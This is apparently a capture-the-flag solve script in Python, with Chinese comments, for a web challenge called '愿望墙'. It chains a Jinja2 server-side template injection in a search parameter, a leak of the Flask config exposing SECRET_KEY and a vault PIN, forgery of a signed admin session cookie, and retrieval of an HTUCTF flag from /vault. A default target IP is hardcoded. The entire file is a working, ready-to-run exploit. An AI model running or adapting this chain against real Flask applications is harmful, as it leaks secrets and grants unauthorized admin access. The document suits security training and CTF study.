# -*- coding: utf-8 -*-
"""愿望墙 — Jinja2 SSTI → {{config}} 泄露 → Flask 会话伪造 → 保险箱
用法: python solve_ssti.py http://IP:PORT
依赖: flask, itsdangerous（与题目同栈）
"""
import html
import re
import sys
import urllib.parse
import urllib.request
import urllib.error

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://103.163.47.230:33700"


def get(path, cookie=None):
    h = {"Cookie": cookie} if cookie else {}
    try:
        with urllib.request.urlopen(urllib.request.Request(BASE + path, headers=h), timeout=20) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def render(expr):
    """把 SSTI 表达式打到检索框，返回渲染后的文本"""
    s, b = get("/search?q=" + urllib.parse.quote(expr))
    m = re.search(r"正在为你检索愿望：<b>(.*?)</b>", b, re.S)
    return s, html.unescape(m.group(1)).strip() if m else "(未渲染)"


# 1) 确认服务端执行了表达式
print("[1] {{7*7}} ->", render("{{7*7}}")[1])

# 2) 直球 {{config}} 即可拿到 SECRET_KEY / VAULT_PIN
#    （黑名单只拦 request / session 等少数词，config 未被拦）
s, cfg = render("{{config}}")
print("[2] {{config}} ->", cfg[:80], "...")

key = re.search(r"'SECRET_KEY': '([^']+)'", cfg)
pin = re.search(r"'VAULT_PIN': '([^']+)'", cfg)
if not (key and pin):
    sys.exit("config 中没有 SECRET_KEY / VAULT_PIN")
SECRET_KEY, VAULT_PIN = key.group(1), pin.group(1)
print("    SECRET_KEY =", SECRET_KEY)
print("    VAULT_PIN  =", VAULT_PIN)

# 3) 伪造 admin 会话
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = SECRET_KEY
ser = SecureCookieSessionInterface().get_signing_serializer(app)
cookie = "session=" + ser.dumps({"username": "admin", "vault_pin": VAULT_PIN})
print("[3] cookie =", cookie[:70], "...")

# 4) 带 cookie 打开保险箱
s, b = get("/vault", cookie)
m = re.search(r"HTUCTF\{[^}]*\}", b)
print("[4] /vault ->", m.group(0) if m else re.sub(r"<[^>]+>", " ", b)[:400])
